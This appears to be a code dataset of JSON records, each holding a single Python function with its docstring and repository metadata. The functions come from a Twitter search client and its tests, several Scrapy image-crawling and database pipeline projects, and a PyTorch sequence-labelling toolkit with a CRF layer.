{"docstring": "\"\"\" Tests TwitterSearchOrder.set_keywords() and .add_keyword() \"\"\"\n\n", "func_signal": "def test_TSO_keywords(self):\n", "code": "tso = self.getCopy()\ntso.set_keywords([ 'foo', 'bar' ])\nself.assertEqual(tso.create_search_url()[0:10], '?q=foo+bar', \"Keywords are NOT equal\")\n\ntso.add_keyword(['one', 'two'])\nself.assertEqual(tso.create_search_url()[0:18], '?q=foo+bar+one+two', \"Keywords are NOT equal\")\n\ntso.add_keyword('test')\nself.assertEqual(tso.create_search_url()[0:23], '?q=foo+bar+one+two+test', \"Keywords are NOT equal\")\n\ntso.set_keywords(['test'])\nself.assertEqual(tso.create_search_url()[0:7], '?q=test', \"Keywords are NOT equal\")\n\n# space keywords\nspace_test = \"James Bond\"\ntest_against = \"%22\" + space_test.replace(\" \",\"+\") + \"%22\"\ntso.add_keyword(space_test)\nself.assertTrue(test_against in tso.create_search_url())\ntso.set_keywords([space_test])\nself.assertTrue(test_against in tso.create_search_url())\n\n# wrong values\ntry:\n    tso.add_keyword({ 'foo' : 'bar' })\nexcept TwitterSearchException as e:\n    self.assertEqual(e.code, 1000, \"Wrong exception code\")\n\ntry:\n    tso.set_keywords({ 'other' : 'stuff'})\nexcept TwitterSearchException as e:\n    self.assertEqual(e.code, 1001, \"Wrong exception code\")\n\ntso2 = TwitterSearchOrder()\ntry:\n    tso2.create_search_url()\nexcept TwitterSearchException as e:\n    self.assertEqual(e.code, 1015, \"Wrong exception code\")", "path": "tests\\test_tso.py", "repo_name": "ckoepp/TwitterSearch", "stars": 385, "license": "mit", "language": "python", "size": 312}
{"docstring": "\"\"\" Tests TwitterSearchOrder.set_geocode() \"\"\"\n\n", "func_signal": "def test_TSO_geo(self):\n", "code": "tso = self.getCopy()\ncor_geo = [ 0.0, -12.331, 99.019, 12.33 ]\nfor lat in cor_geo:\n    is_km = bool(random.getrandbits(1))\n    lon = random.choice(cor_geo)\n    radius = self.generateInt(1,100)\n    tso.set_geocode( lat, lon, radius, imperial_metric=is_km)\n\n    unit = ( 'km' if is_km else 'mi' )\n\n    cor = '%s&geocode=%s,%s,%s%s' % (self.__tso.create_search_url(), lat, lon, radius, unit)\n    self.assertEqualQuery(tso.create_search_url(), cor)\n\n# wrong values\nwrong_values = [-1, 1.0, 101, '', [], {} ]\nfor value in wrong_values:\n    try:\n        radius = self.generateInt(-200,-1)\n        unit = bool(random.getrandbits(1))\n        tso.set_geocode( value, value, radius, imperial_metric=unit)\n        self.assertTrue(False, \"Not raising exception for lat %s, lon %s, radius %s and metric %s\" % (value,value,radius,unit))\n    except TwitterSearchException as e:\n        self.assertTrue((e.code == 1004 or e.code == 1005), \"Wrong exception code\")\n\ntry:\n    tso.set_geocode(2.0,1.0,10, imperial_metric='foo')\nexcept TwitterSearchException as e:\n    self.assertEqual(e.code, 1005, 'Wrong exception code')\n\ntry:\n   tso.set_geocode('foo','bar',10)\nexcept TwitterSearchException as e:\n    self.assertEqual(e.code, 1004, 'Wrong exception code')", "path": "tests\\test_tso.py", "repo_name": "ckoepp/TwitterSearch", "stars": 385, "license": "mit", "language": "python", "size": 312}
{"docstring": "\"\"\" Tests unimplemented TwitterOrder functions aiming for exceptions \"\"\"\n\n", "func_signal": "def test_TO_exceptions(self):\n", "code": "value = \"foo\"\nexc_class = NotImplementedError\nto = TwitterOrder()\nwith self.assertRaises(exc_class):\n    to.set_search_url(value)\n    to.create_search_url()", "path": "tests\\test_tso.py", "repo_name": "ckoepp/TwitterSearch", "stars": 385, "license": "mit", "language": "python", "size": 312}
{"docstring": "\"\"\" Triggers the search for more results using the Twitter API. \\\nRaises exception if no further results can be found. \\\nSee `Advanced usage <advanced_usage.html>`_ for example\n\n:returns: ``True`` if there are more results available \\\nwithin the Twitter Search API\n:raises: TwitterSearchException\n\"\"\"\n\n", "func_signal": "def search_next_results(self):\n", "code": "if not self.__next_max_id:\n    raise TwitterSearchException(1011)\n\nself.send_search(\n    \"%s&max_id=%i\" % (self._start_url, self.__next_max_id)\n)\nreturn True", "path": "TwitterSearch\\TwitterSearch.py", "repo_name": "ckoepp/TwitterSearch", "stars": 385, "license": "mit", "language": "python", "size": 312}
{"docstring": "\"\"\" Tests TwitterSearchOrder.set_callback() \"\"\"\n\n", "func_signal": "def test_TSO_callback(self):\n", "code": "tso = self.getCopy()\ncorrect_values = [ self.generateString() for x in range(0,10) ]\n\nfor value in correct_values:\n    tso.set_callback(value)\n    cor = '%s&callback=%s' % (self.__tso.create_search_url(), value)\n    self.assertEqualQuery(tso.create_search_url(), cor)\n\n    # wrong values\n    wrong_values = [ '', 1, 1.0, [], {} ]\n    for value in wrong_values:\n        try:\n            tso.set_callback(value)\n            self.assertTrue(False, \"Not raising exception for %s\" % value)\n        except TwitterSearchException as e:\n            self.assertEqual(e.code, 1006, \"Wrong exception code\")", "path": "tests\\test_tso.py", "repo_name": "ckoepp/TwitterSearch", "stars": 385, "license": "mit", "language": "python", "size": 312}
{"docstring": "\"\"\" Queries the Twitter API with a given query string and \\\nstores the results internally. Also validates returned HTTP status \\\ncode and throws an exception in case of invalid HTTP states. \\\nExample usage ``sendSearch('?q=One+Two&count=100')``\n\n:param url: A string of the URL to send the query to\n:raises: TwitterSearchException\n\"\"\"\n\n", "func_signal": "def send_search(self, url):\n", "code": "if not isinstance(url, str if py3k else basestring):\n    raise TwitterSearchException(1009)\n\nendpoint = self._base_url + (self._search_url\n                             if self.__order_is_search\n                             else self._user_url)\n\nr = requests.get(endpoint + url,\n                 auth=self.__oauth,\n                 proxies={\"https\": self.__proxy})\n\nself.__response['meta'] = r.headers\n\nself.check_http_status(r.status_code)\n\nself.__response['content'] = r.json()\n\n# update statistics if everything worked fine so far\nseen_tweets = self.get_amount_of_tweets()\nself.__statistics[0] += 1\nself.__statistics[1] += seen_tweets\n\n# call callback if available\nif self.__callback:\n    self.__callback(self)\n\n# if we've seen the correct amount of tweets there may be some more\n# using IDs to request more results\n# (former versions used page parameter)\n# see https://dev.twitter.com/docs/working-with-timelines\n\n# a leading ? char does \"confuse\" parse_qs()\nif url[0] == '?':\n    url = url[1:]\ngiven_count = int(parse_qs(url)['count'][0])\n\n# Search API does have valid count values\nif self.__order_is_search and seen_tweets == given_count:\n    self.__next_max_id = self.get_minimal_id()\n\n# Timelines doesn't have valid count values\n# see: https://dev.twitter.com/docs/faq\n# see section: \"How do I properly navigate a timeline?\"\nelif (not self.__order_is_search and\n      len(self.__response['content']) > 0):\n    self.__next_max_id = self.get_minimal_id()\n\nelse:  # we got less tweets than requested -> no more results in API\n    self.__next_max_id = None\n\nreturn self.__response['meta'], self.__response['content']", "path": "TwitterSearch\\TwitterSearch.py", "repo_name": "ckoepp/TwitterSearch", "stars": 385, "license": "mit", "language": "python", "size": 312}
{"docstring": "\"\"\" Returns all available data from last query. \\\nSee `Advanced usage <advanced_usage.html>`_ for example\n\n:returns: All tweets found using the last query as a ``dict``\n:raises: TwitterSearchException\n\"\"\"\n\n", "func_signal": "def get_tweets(self):\n", "code": "if not self.__response:\n    raise TwitterSearchException(1013)\nreturn self.__response['content']", "path": "TwitterSearch\\TwitterSearch.py", "repo_name": "ckoepp/TwitterSearch", "stars": 385, "license": "mit", "language": "python", "size": 312}
{"docstring": "\"\"\" Loads currently supported languages from Twitter API \\\nand sets them in a given TwitterSearchOrder instance.\nSee `Advanced usage <advanced_usage.html>`_ for example\n\n:param order: A TwitterOrder instance. \\\nCan be either TwitterSearchOrder or TwitterUserOrder\n\"\"\"\n\n", "func_signal": "def set_supported_languages(self, order):\n", "code": "if not isinstance(order, TwitterSearchOrder):\n    raise TwitterSearchException(1010)\n\nr = requests.get(self._base_url + self._lang_url,\n                 auth=self.__oauth,\n                 proxies={\"https\": self.__proxy})\n\nself.__response['meta'] = r.headers\nself.check_http_status(r.status_code)\nself.__response['content'] = r.json()\n\norder.iso_6391 = []\nfor lang in self.__response['content']:\n    order.iso_6391.append(lang['code'])", "path": "TwitterSearch\\TwitterSearch.py", "repo_name": "ckoepp/TwitterSearch", "stars": 385, "license": "mit", "language": "python", "size": 312}
{"docstring": "\"\"\" Tests TwitterSearchOrder.set_since() \"\"\"\n\n", "func_signal": "def test_TSO_since(self):\n", "code": "tso = self.getCopy()\n\n# expected input\ncorrect_values = self.generateCorrectDates()\nfor value in correct_values:\n    tso.set_since(value)\n    cor = '%s&since=%s' % (self.__tso.create_search_url(), value.strftime('%Y-%m-%d'))\n    self.assertEqualQuery(tso.create_search_url(), cor)\n\n# unexpected input\nwrong_values = self.generateWrongDates()\nfor value in wrong_values:\n    try:\n        tso.set_since(value)\n        assertTrue(False, \"Not raising exception for %s\" % value.strfttime('%Y-%m-%d'))\n    except TwitterSearchException as e:\n        self.assertEqual(e.code, 1007, \"Wrong exception code\")", "path": "tests\\test_tso.py", "repo_name": "ckoepp/TwitterSearch", "stars": 385, "license": "mit", "language": "python", "size": 312}
{"docstring": "\"\"\" Constructor \"\"\"\n\n", "func_signal": "def setUp(self):\n", "code": "self.__tso = TwitterSearchOrder()\nself.__tso.set_keywords( [ self._stdkeyword ] )", "path": "tests\\test_tso.py", "repo_name": "ckoepp/TwitterSearch", "stars": 385, "license": "mit", "language": "python", "size": 312}
{"docstring": "# This method is used by Scrapy to create your spiders.\n", "func_signal": "def from_crawler(cls, crawler):\n", "code": "s = cls()\ncrawler.signals.connect(s.spider_opened, signal=signals.spider_opened)\nreturn s", "path": "ImagesRename\\ImagesRename\\middlewares.py", "repo_name": "cuanboy/ScrapyProject", "stars": 395, "license": "None", "language": "python", "size": 983}
{"docstring": "# Called with the results returned from the Spider, after\n# it has processed the response.\n\n# Must return an iterable of Request, dict or Item objects.\n", "func_signal": "def process_spider_output(response, result, spider):\n", "code": "for i in result:\n    yield i", "path": "InputMongodb\\InputMongodb\\middlewares.py", "repo_name": "cuanboy/ScrapyProject", "stars": 395, "license": "None", "language": "python", "size": 983}
{"docstring": "# This method is used by Scrapy to create your spiders.\n", "func_signal": "def from_crawler(cls, crawler):\n", "code": "s = cls()\ncrawler.signals.connect(s.spider_opened, signal=signals.spider_opened)\nreturn s", "path": "InputMongodb\\InputMongodb\\middlewares.py", "repo_name": "cuanboy/ScrapyProject", "stars": 395, "license": "None", "language": "python", "size": 983}
{"docstring": "# \u5b9e\u4f8b\u5316item\n", "func_signal": "def parse(self, response):\n", "code": "item = ImagesrenameItem()\n# \u6ce8\u610fimgurls\u662f\u4e00\u4e2a\u96c6\u5408\u4e5f\u5c31\u662f\u591a\u5f20\u56fe\u7247\nitem['imgurl'] = response.css(\".post img::attr(src)\").extract()\n# \u6293\u53d6\u6587\u7ae0\u6807\u9898\u4f5c\u4e3a\u56fe\u96c6\u540d\u79f0\nitem['imgname'] = response.css(\".post-title a::text\").extract_first()\nyield item", "path": "ImagesRename\\ImagesRename\\spiders\\ImgsRename.py", "repo_name": "cuanboy/ScrapyProject", "stars": 395, "license": "None", "language": "python", "size": 983}
{"docstring": "# Called with the results returned from the Spider, after\n# it has processed the response.\n\n# Must return an iterable of Request, dict or Item objects.\n", "func_signal": "def process_spider_output(self, response, result, spider):\n", "code": "for i in result:\n    yield i", "path": "ImageSpider\\ImageSpider\\middlewares.py", "repo_name": "cuanboy/ScrapyProject", "stars": 395, "license": "None", "language": "python", "size": 983}
{"docstring": "# \u63d0\u53d6url\u524d\u9762\u540d\u79f0\u4f5c\u4e3a\u56fe\u7247\u540d\u3002\n", "func_signal": "def file_path(self, request, response=None, info=None):\n", "code": "        image_guid = request.url.split('/')[-1]\n        # \u63a5\u6536\u4e0a\u9762meta\u4f20\u9012\u8fc7\u6765\u7684\u56fe\u7247\u540d\u79f0\n        name = request.meta['name']\n        # \u8fc7\u6ee4windows\u5b57\u7b26\u4e32\uff0c\u4e0d\u7ecf\u8fc7\u8fd9\u4e48\u4e00\u4e2a\u6b65\u9aa4\uff0c\u4f60\u4f1a\u53d1\u73b0\u6709\u4e71\u7801\u6216\u65e0\u6cd5\u4e0b\u8f7d\n        name = re.sub(r'[\uff1f\\\\*|\u201c<>:/]', '', name)\n        # \u5206\u6587\u4ef6\u5939\u5b58\u50a8\u7684\u5173\u952e\uff1a{0}\u5bf9\u5e94\u7740name\uff1b{1}\u5bf9\u5e94\u7740image_guid\n        filename = u'{0}/{1}'.format(name, image_guid)\n        return filename", "path": "ImagesRename\\ImagesRename\\pipelines.py", "repo_name": "cuanboy/ScrapyProject", "stars": 395, "license": "None", "language": "python", "size": 983}
{"docstring": "# Called with the results returned from the Spider, after\n# it has processed the response.\n\n# Must return an iterable of Request, dict or Item objects.\n", "func_signal": "def process_spider_output(self, response, result, spider):\n", "code": "for i in result:\n    yield i", "path": "ImagesRename\\ImagesRename\\middlewares.py", "repo_name": "cuanboy/ScrapyProject", "stars": 395, "license": "None", "language": "python", "size": 983}
{"docstring": "# This method is used by Scrapy to create your spiders.\n", "func_signal": "def from_crawler(cls, crawler):\n", "code": "s = cls()\ncrawler.signals.connect(s.spider_opened, signal=signals.spider_opened)\nreturn s", "path": "scrapyMysql\\scrapyMysql\\middlewares.py", "repo_name": "cuanboy/ScrapyProject", "stars": 395, "license": "None", "language": "python", "size": 983}
{"docstring": "# \u5faa\u73af\u6bcf\u4e00\u5f20\u56fe\u7247\u5730\u5740\u4e0b\u8f7d\uff0c\u82e5\u4f20\u8fc7\u6765\u7684\u4e0d\u662f\u96c6\u5408\u5219\u65e0\u9700\u5faa\u73af\u76f4\u63a5yield\n", "func_signal": "def get_media_requests(self, item, info):\n", "code": "for image_url in item['imgurl']:\n    # meta\u91cc\u9762\u7684\u6570\u636e\u662f\u4ecespider\u83b7\u53d6\uff0c\u7136\u540e\u901a\u8fc7meta\u4f20\u9012\u7ed9\u4e0b\u9762\u65b9\u6cd5\uff1afile_path\n    yield Request(image_url,meta={'name':item['imgname']})", "path": "ImagesRename\\ImagesRename\\pipelines.py", "repo_name": "cuanboy/ScrapyProject", "stars": 395, "license": "None", "language": "python", "size": 983}
{"docstring": "# This method is used by Scrapy to create your spiders.\n", "func_signal": "def from_crawler(cls, crawler):\n", "code": "s = cls()\ncrawler.signals.connect(s.spider_opened, signal=signals.spider_opened)\nreturn s", "path": "ImageSpider\\ImageSpider\\middlewares.py", "repo_name": "cuanboy/ScrapyProject", "stars": 395, "license": "None", "language": "python", "size": 983}
{"docstring": "# Called with the results returned from the Spider, after\n# it has processed the response.\n\n# Must return an iterable of Request, dict or Item objects.\n", "func_signal": "def process_spider_output(response, result, spider):\n", "code": "for i in result:\n    yield i", "path": "scrapyMysql\\scrapyMysql\\middlewares.py", "repo_name": "cuanboy/ScrapyProject", "stars": 395, "license": "None", "language": "python", "size": 983}
{"docstring": "'''\u8bbe\u7f6eheaders\u548c\u5207\u6362\u8bf7\u6c42\u5934'''\n", "func_signal": "def process_request(self, request, spider):\n", "code": "referer = request.url\nif referer:\n    request.headers['referer'] = referer", "path": "AoiSolas\\AoiSolas\\middlewares.py", "repo_name": "cuanboy/ScrapyProject", "stars": 395, "license": "None", "language": "python", "size": 983}
{"docstring": "# Called with the start requests of the spider, and works\n# similarly to the process_spider_output() method, except\n# that it doesn\u2019t have a response associated.\n\n# Must return only requests (not items).\n", "func_signal": "def process_start_requests(start_requests, spider):\n", "code": "for r in start_requests:\n    yield r", "path": "InputMongodb\\InputMongodb\\middlewares.py", "repo_name": "cuanboy/ScrapyProject", "stars": 395, "license": "None", "language": "python", "size": 983}
{"docstring": "# \u8fde\u63a5\u6570\u636e\u5e93\n", "func_signal": "def __init__(self):\n", "code": "self.connect = pymysql.connect(\n    host='127.0.0.1',  # \u6570\u636e\u5e93\u5730\u5740\n    port=3306,  # \u6570\u636e\u5e93\u7aef\u53e3\n    db='scrapyMysql',  # \u6570\u636e\u5e93\u540d\n    user='root',  # \u6570\u636e\u5e93\u7528\u6237\u540d\n    passwd='root',  # \u6570\u636e\u5e93\u5bc6\u7801\n    charset='utf8',  # \u7f16\u7801\u65b9\u5f0f\n    use_unicode=True)\n# \u901a\u8fc7cursor\u6267\u884c\u589e\u5220\u67e5\u6539\nself.cursor = self.connect.cursor()", "path": "scrapyMysql\\scrapyMysql\\MySQLPipline.py", "repo_name": "cuanboy/ScrapyProject", "stars": 395, "license": "None", "language": "python", "size": 983}
{"docstring": "# Called with the start requests of the spider, and works\n# similarly to the process_spider_output() method, except\n# that it doesn\u2019t have a response associated.\n\n# Must return only requests (not items).\n", "func_signal": "def process_start_requests(start_requests, spider):\n", "code": "for r in start_requests:\n    yield r", "path": "scrapyMysql\\scrapyMysql\\middlewares.py", "repo_name": "cuanboy/ScrapyProject", "stars": 395, "license": "None", "language": "python", "size": 983}
{"docstring": "# Called with the start requests of the spider, and works\n# similarly to the process_spider_output() method, except\n# that it doesn\u2019t have a response associated.\n\n# Must return only requests (not items).\n", "func_signal": "def process_start_requests(self, start_requests, spider):\n", "code": "for r in start_requests:\n    yield r", "path": "ImageSpider\\ImageSpider\\middlewares.py", "repo_name": "cuanboy/ScrapyProject", "stars": 395, "license": "None", "language": "python", "size": 983}
{"docstring": "# \u5b9e\u4f8b\u5316item\n", "func_signal": "def parse(self, response):\n", "code": "item = ImagespiderItem()\n# \u6ce8\u610fimgurls\u662f\u4e00\u4e2a\u96c6\u5408\u4e5f\u5c31\u662f\u591a\u5f20\u56fe\u7247\nimgurls = response.css(\".post img::attr(src)\").extract()\nitem['imgurl'] = imgurls\nyield item", "path": "ImageSpider\\ImageSpider\\spiders\\ImgSpider.py", "repo_name": "cuanboy/ScrapyProject", "stars": 395, "license": "None", "language": "python", "size": 983}
{"docstring": "# Called with the start requests of the spider, and works\n# similarly to the process_spider_output() method, except\n# that it doesn\u2019t have a response associated.\n\n# Must return only requests (not items).\n", "func_signal": "def process_start_requests(self, start_requests, spider):\n", "code": "for r in start_requests:\n    yield r", "path": "ImagesRename\\ImagesRename\\middlewares.py", "repo_name": "cuanboy/ScrapyProject", "stars": 395, "license": "None", "language": "python", "size": 983}
{"docstring": "# \u5efa\u7acbMongoDB\u6570\u636e\u5e93\u8fde\u63a5\n", "func_signal": "def __init__(self):\n", "code": "client = pymongo.MongoClient('127.0.0.1', 27017)\n# \u8fde\u63a5\u6240\u9700\u6570\u636e\u5e93,ScrapyChina\u4e3a\u6570\u636e\u5e93\u540d\ndb = client['ScrapyChina']\n# \u8fde\u63a5\u6240\u7528\u96c6\u5408\uff0c\u4e5f\u5c31\u662f\u6211\u4eec\u901a\u5e38\u6240\u8bf4\u7684\u8868\uff0cmingyan\u4e3a\u8868\u540d\nself.post = db['mingyan']", "path": "InputMongodb\\InputMongodb\\inputMongodbPipeline.py", "repo_name": "cuanboy/ScrapyProject", "stars": 395, "license": "None", "language": "python", "size": 983}
{"docstring": "# \u5faa\u73af\u6bcf\u4e00\u5f20\u56fe\u7247\u5730\u5740\u4e0b\u8f7d\uff0c\u82e5\u4f20\u8fc7\u6765\u7684\u4e0d\u662f\u96c6\u5408\u5219\u65e0\u9700\u5faa\u73af\u76f4\u63a5yield\n", "func_signal": "def get_media_requests(self, item, info):\n", "code": "for image_url in item['imgurl']:\n    yield Request(image_url)", "path": "ImageSpider\\ImageSpider\\pipelines.py", "repo_name": "cuanboy/ScrapyProject", "stars": 395, "license": "None", "language": "python", "size": 983}
{"docstring": "\"\"\"\u5c06numpy\u8f6c\u6362\u4e3atensor\nArgs:\n    data: numpy\n    dtype: long or float\n    use_cuda: bool\n\"\"\"\n", "func_signal": "def tensor_from_numpy(data, dtype='long', use_cuda=True):\n", "code": "assert dtype in ('long', 'float')\nif dtype == 'long':\n    data = torch.from_numpy(data).long()\nelse:\n    data = torch.from_numpy(data).float()\nif use_cuda:\n    data = data.cuda()\nreturn data", "path": "sltk\\infer\\inference.py", "repo_name": "liu-nlper/SLTK", "stars": 362, "license": "None", "language": "python", "size": 683}
{"docstring": "\"\"\"\nArgs:\n     feature_names: list(str), \u7279\u5f81\u540d\u79f0\n     feature_size_dict: dict({str: int}), \u7279\u5f81\u540d\u79f0\u5230\u7279\u5f81alphabet\u5927\u5c0f\u6620\u5c04\u5b57\u5178\n     feature_dim_dict: dict({str: int}), \u7279\u5f81\u540d\u79f0\u5230\u7279\u5f81\u7ef4\u5ea6\u6620\u5c04\u5b57\u5178\n\n     require_grad_dict: dict({str: bool})\uff0c\u7279\u5f81embedding\u8868\u662f\u5426\u9700\u8981\u66f4\u65b0\uff0c\u7279\u5f81\u540d: bool\n     pretrained_embed_dict: dict({str: np.array}): \u7279\u5f81\u7684\u9884\u8bad\u7ec3embedding table\n\"\"\"\n", "func_signal": "def __init__(self, **kwargs):\n", "code": "super(WordFeature, self).__init__()\nfor k in kwargs:\n    self.__setattr__(k, kwargs[k])\n\nif not hasattr(self, 'require_grad_dict'):  # \u9ed8\u8ba4\u9700\u8981\u66f4\u65b0\n    self.require_grad_dict = dict()\n    for feature_name in self.feature_names:\n        self.require_grad_dict[feature_name] = True\nfor feature_name in self.feature_names:\n    if feature_name not in self.require_grad_dict:\n        self.require_grad_dict[feature_name] = True\n\nif not hasattr(self, 'pretrained_embed_dict'):  # \u9ed8\u8ba4\u968f\u673a\u521d\u59cb\u5316feature embedding\n    self.pretrained_embed_dict = dict()\n    for feature_name in self.feature_names:\n        self.pretrained_embed_dict[feature_name] = None\nfor feature_name in self.feature_names:\n    if feature_name not in self.pretrained_embed_dict:\n        self.pretrained_embed_dict[feature_name] = None\n\n# feature embedding layer\nself.feature_embedding_list = nn.ModuleList()\nfor feature_name in self.feature_names:\n    embed = nn.Embedding(self.feature_size_dict[feature_name], self.feature_dim_dict[feature_name])\n    if self.pretrained_embed_dict[feature_name] is not None:  # \u9884\u8bad\u7ec3\u5411\u91cf\n        # print('\u9884\u8bad\u7ec3:', feature_name)\n        embed.weight.data.copy_(torch.from_numpy(self.pretrained_embed_dict[feature_name]))\n    else:  # \u968f\u673a\u521d\u59cb\u5316\n        # print('\u968f\u673a\u521d\u59cb\u5316:', feature_name)\n        init_embedding(embed.weight)\n    # \u662f\u5426\u9700\u8981\u6839\u636eembedding\u7684\u6743\u91cd\n    embed.weight.requires_grad = self.require_grad_dict[feature_name]\n    self.feature_embedding_list.append(embed)", "path": "sltk\\nn\\modules\\feature.py", "repo_name": "liu-nlper/SLTK", "stars": 362, "license": "None", "language": "python", "size": 683}
{"docstring": "\"\"\"\nArgs:\n    feats: size=(batch_size, seq_len, self.target_size+2)\n    mask: size=(batch_size, seq_len)\n\nReturns:\n    decode_idx: (batch_size, seq_len), viterbi decode\u7ed3\u679c\n    path_score: size=(batch_size, 1), \u6bcf\u4e2a\u53e5\u5b50\u7684\u5f97\u5206\n\"\"\"\n", "func_signal": "def _viterbi_decode(self, feats, mask):\n", "code": "batch_size = feats.size(0)\nseq_len = feats.size(1)\ntag_size = feats.size(-1)\n\nlength_mask = torch.sum(mask, dim=1).view(batch_size, 1).long()\n\nmask = mask.transpose(1, 0).contiguous()\nins_num = seq_len * batch_size\n\nfeats = feats.transpose(1, 0).contiguous().view(\n    ins_num, 1, tag_size).expand(ins_num, tag_size, tag_size)\n\nscores = feats + self.transitions.view(\n    1, tag_size, tag_size).expand(ins_num, tag_size, tag_size)\nscores = scores.view(seq_len, batch_size, tag_size, tag_size)\n\nseq_iter = enumerate(scores)\n# record the position of the best score\nback_points = list()\npartition_history = list()\n\n# mask = 1 + (-1) * mask\nmask = (1 - mask.long()).byte()\ntry:\n    _, inivalues = seq_iter.__next__()\nexcept:\n    _, inivalues = seq_iter.next()\n\npartition = inivalues[:, self.START_TAG_IDX, :].clone().view(batch_size, tag_size, 1)\npartition_history.append(partition)\n\nfor idx, cur_values in seq_iter:\n    cur_values = cur_values + partition.contiguous().view(\n        batch_size, tag_size, 1).expand(batch_size, tag_size, tag_size)\n    partition, cur_bp = torch.max(cur_values, 1)\n    partition_history.append(partition.unsqueeze(-1))\n\n    cur_bp.masked_fill_(mask[idx].view(batch_size, 1).expand(batch_size, tag_size), 0)\n    back_points.append(cur_bp)\n\npartition_history = torch.cat(partition_history).view(\n    seq_len, batch_size, -1).transpose(1, 0).contiguous()\n\nlast_position = length_mask.view(batch_size, 1, 1).expand(batch_size, 1, tag_size) - 1\nlast_partition = torch.gather(\n    partition_history, 1, last_position).view(batch_size, tag_size, 1)\n\nlast_values = last_partition.expand(batch_size, tag_size, tag_size) + \\\n    self.transitions.view(1, tag_size, tag_size).expand(batch_size, tag_size, tag_size)\n_, last_bp = torch.max(last_values, 1)\npad_zero = Variable(torch.zeros(batch_size, tag_size)).long()\nif self.use_cuda:\n    pad_zero = pad_zero.cuda()\nback_points.append(pad_zero)\nback_points = torch.cat(back_points).view(seq_len, batch_size, tag_size)\n\npointer = last_bp[:, self.END_TAG_IDX]\ninsert_last = pointer.contiguous().view(batch_size, 1, 1).expand(batch_size, 1, tag_size)\nback_points = back_points.transpose(1, 0).contiguous()\n\nback_points.scatter_(1, last_position, insert_last)\n\nback_points = back_points.transpose(1, 0).contiguous()\n\ndecode_idx = Variable(torch.LongTensor(seq_len, batch_size))\nif self.use_cuda:\n    decode_idx = decode_idx.cuda()\ndecode_idx[-1] = pointer.data\nfor idx in range(len(back_points)-2, -1, -1):\n    pointer = torch.gather(back_points[idx], 1, pointer.contiguous().view(batch_size, 1))\n    decode_idx[idx] = pointer.view(-1).data\npath_score = None\ndecode_idx = decode_idx.transpose(1, 0)\nreturn path_score, decode_idx", "path": "sltk\\nn\\modules\\crf.py", "repo_name": "liu-nlper/SLTK", "stars": 362, "license": "None", "language": "python", "size": 683}
{"docstring": "\"\"\"\u5c06label ids\u8f6c\u4e3alabel\nArgs:\n    label_ids_array: list(np.array)\n\nReturns:\n    labels: list(list(str))\n\"\"\"\n", "func_signal": "def id2label(self, label_ids_array):\n", "code": "labels = []\nfor label_array in label_ids_array:\n    temp = []\n    for idx in label_array:\n        temp.append(self.id2label_dict[idx])\n    labels.append(temp)\nreturn labels", "path": "sltk\\infer\\inference.py", "repo_name": "liu-nlper/SLTK", "stars": 362, "license": "None", "language": "python", "size": 683}
{"docstring": "\"\"\"\u9884\u6d4b\nReturns:\n    labels: list of int\n\"\"\"\n", "func_signal": "def infer(self):\n", "code": "self.model.eval()\nlabels_pred = []\nfor feed_dict in self.data_iter:\n    feed_tensor_dict = self._get_inputs(feed_dict, self.model.use_cuda)\n\n    logits = self.model(**feed_tensor_dict)\n    # mask\n    mask = feed_tensor_dict[str(self.feature_names[0])] > 0\n    actual_lens = torch.sum(feed_tensor_dict[self.feature_names[0]] > 0, dim=1).int()\n    labels_batch = self.model.predict(logits, actual_lens, mask)\n    labels_pred.extend(labels_batch)\n    sys.stdout.write('sentence: {0} / {1}\\r'.format(self.data_iter.iter_variable, self.data_iter.data_count))\nsys.stdout.write('sentence: {0} / {1}\\n'.format(self.data_iter.data_count, self.data_iter.data_count))\n\nreturn labels_pred", "path": "sltk\\infer\\inference.py", "repo_name": "liu-nlper/SLTK", "stars": 362, "license": "None", "language": "python", "size": 683}
{"docstring": "\"\"\"\nArgs:\n    feats: size=(batch_size, seq_len, tag_size)\n    mask: size=(batch_size, seq_len)\n    tags: size=(batch_size, seq_len)\n\"\"\"\n", "func_signal": "def loss(self, feats, mask, tags):\n", "code": "if not self.use_crf:\n    batch_size, max_len = feats.size(0), feats.size(1)\n    lstm_feats = feats.view(batch_size * max_len, -1)\n    tags = tags.view(-1)\n    return self.loss_function(lstm_feats, tags)\nelse:\n    loss_value = self.loss_function(feats, mask, tags)\nif self.average_batch:\n    batch_size = feats.size(0)\n    loss_value /= float(batch_size)\nreturn loss_value", "path": "sltk\\nn\\modules\\sequence_labeling_model.py", "repo_name": "liu-nlper/SLTK", "stars": 362, "license": "None", "language": "python", "size": 683}
{"docstring": "\"\"\"\nArgs:\n    target_size: int, target size\n    use_cuda: bool, \u662f\u5426\u4f7f\u7528gpu, default is True\n    average_batch: bool, loss\u662f\u5426\u4f5c\u5e73\u5747, default is True\n\"\"\"\n", "func_signal": "def __init__(self, **kwargs):\n", "code": "super(CRF, self).__init__()\nfor k in kwargs:\n    self.__setattr__(k, kwargs[k])\nif not hasattr(self, 'average_batch'):\n    self.__setattr__('average_batch', True)\nif not hasattr(self, 'use_cuda'):\n    self.__setattr__('use_cuda', True)\n\n# init transitions\nself.START_TAG_IDX, self.END_TAG_IDX = -2, -1\ninit_transitions = torch.zeros(self.target_size+2, self.target_size+2)\ninit_transitions[:, self.START_TAG_IDX] = -1000.\ninit_transitions[self.END_TAG_IDX, :] = -1000.\nif self.use_cuda:\n    init_transitions = init_transitions.cuda()\nself.transitions = nn.Parameter(init_transitions)", "path": "sltk\\nn\\modules\\crf.py", "repo_name": "liu-nlper/SLTK", "stars": 362, "license": "None", "language": "python", "size": 683}
{"docstring": "\"\"\"\n\u8bfb\u53d6\u9884\u8bad\u7ec3\u7684embedding\nArgs:\n    path_embed: str, bin or txt\nReturns:\n    word_embed_dict: dict, \u5065: word, \u503c: np.array, vector\n    word_dim: int, \u8bcd\u5411\u91cf\u7684\u7ef4\u5ea6\n\"\"\"\n", "func_signal": "def load_embed_with_gensim(path_embed):\n", "code": "from gensim.models.keyedvectors import KeyedVectors\nif path_embed.endswith('bin'):\n    word_vectors = KeyedVectors.load_word2vec_format(path_embed, binary=True)\nelif path_embed.endswith('txt'):\n    word_vectors = KeyedVectors.load_word2vec_format(path_embed, binary=False)\nelse:\n    raise ValueError('`path_embed` must be `bin` or `txt` file!')\nreturn word_vectors, word_vectors.vector_size", "path": "sltk\\utils\\embedding.py", "repo_name": "liu-nlper/SLTK", "stars": 362, "license": "None", "language": "python", "size": 683}
